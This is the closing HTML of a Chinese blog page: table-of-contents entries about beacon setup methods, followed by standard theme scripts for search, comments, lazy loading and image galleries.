href="#%E4%B8%8A%E7%BA%BF%E7%BB%8F%E8%BF%87%E7%9A%84%E6%B5%81%E7%A8%8B%E4%B8%8D%E5%90%8C"><span class="toc-text">上线经过的流程不同</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon-DNS%E4%B8%8A%E7%BA%BF"><span class="toc-text">Beacon DNS上线</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-text">域名的配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%9B%91%E5%90%AC%E5%99%A8-1"><span class="toc-text">创建监听器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90Payload"><span class="toc-text">生成Payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-command%E4%B8%8A%E7%BA%BF"><span class="toc-text">powershell command上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripted-Web-Delivery-S-%E4%B8%8A%E7%BA%BF"><span class="toc-text">Scripted Web Delivery(S)上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E6%96%87%E4%BB%B6%E4%B8%8A%E7%BA%BF"><span class="toc-text">DLL文件上线</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
